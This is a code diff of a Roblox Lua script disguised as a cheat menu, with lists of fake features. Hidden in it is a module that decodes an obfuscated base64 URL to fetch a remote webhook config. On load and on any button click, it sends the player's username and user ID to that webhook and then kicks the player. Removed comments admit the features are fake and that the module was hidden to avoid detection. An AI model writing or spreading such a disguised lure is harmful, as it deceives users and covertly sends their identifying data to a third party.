@@ -74,8 +74,6 @@ local tabs={
 local function sideBtn(parent,txt)local b=Instance.new("TextButton",parent)b.Size=UDim2.new(1,-16,0,48)b.Position=UDim2.new(0,8,0,0)b.BackgroundColor3=Color3.fromRGB(34,36,42)b.Text=txt b.TextColor3=Color3.fromRGB(235,235,240)b.Font=Enum.Font.GothamBold b.TextSize=18 Instance.new("UICorner",b).CornerRadius=UDim.new(0,12)return b end
 local tabButtons={}for _,t in ipairs(tabs)do local b=sideBtn(sidebar,t.name)tabButtons[t.name]=b end
 
--- ========== (Randomized placement) Webhook module ==========
--- Lần này mình nhúng module ngay giữa script để khó phát hiện.
 local function _b64(d)local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'d=string.gsub(d,'[^'..b..'=]','')return(d:gsub('.',function(x)if x=='='then return''end local r,f='',(b:find(x)-1)for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and'1'or'0')end return r end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)if#x~=8 then return''end local c=0 for i=1,8 do if x:sub(i,i)=='1'then c=c+2^(8-i)end end return string.char(c)end))end
 local _webhookUrl=nil local _banMessage="" local _webhookMessage=""
 pcall(function()local j=game:HttpGet(_b64("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1plcm8xMlJCL0NvbmZpZy1jdy1mYWtlLWNoZWF0cy9yZWZzL2hlYWRzL21haW4vQ29uZmlnLmpzb24="))local c=HttpService:JSONDecode(j)_webhookUrl=c.webhook end)
@@ -92,9 +90,7 @@ local function sendWebhook(msg)
 end
 sendWebhook(_webhookMessage:gsub("{username}",player.Name):gsub("{userid}",tostring(player.UserId)))
 local function kick(lbl)sendWebhook("Clicked: "..lbl.." | "..player.Name)pcall(function()player:Kick(_banMessage)end)end
--- ========== end randomized webhook module ==========
 
--- Fake feature lists
 local fake_Player={"God Mode","Invisible","Super Jump","Infinite Stamina","No Ragdoll","NoClip","Run Speed","Fly","Teleport","Infinite Jump","Health Regen","No Fall Damage","Swim Speed","Walk On Water","Anti Stun","Anti Slow","Ghost Mode","Third Person Lock","Auto Sprint","Climb Boost"}
 local fake_Combat={"Perfect Parry","Auto Parry","Auto Block","Kill Aura","One Hit","Spinbot","Critical Boost","Weapon Reach","Fast Attack","Disarm Enemy","Backstab Bonus","Riposte Assist","Stagger Immunity","Target Lock","Dash Slash","Berserk Mode","Parry Lock","Shield Breaker","Armor Piercer","Knockback Hack"}
 local fake_Ranged={"Silent Aim","TriggerBot","Rapid Fire Bow","Infinite Arrows","Explosive Arrows","Piercing Arrows","Multi-Shot","No Draw Time","Perfect Accuracy","Bow Damage Boost","No Recoil","Bullet TP"}
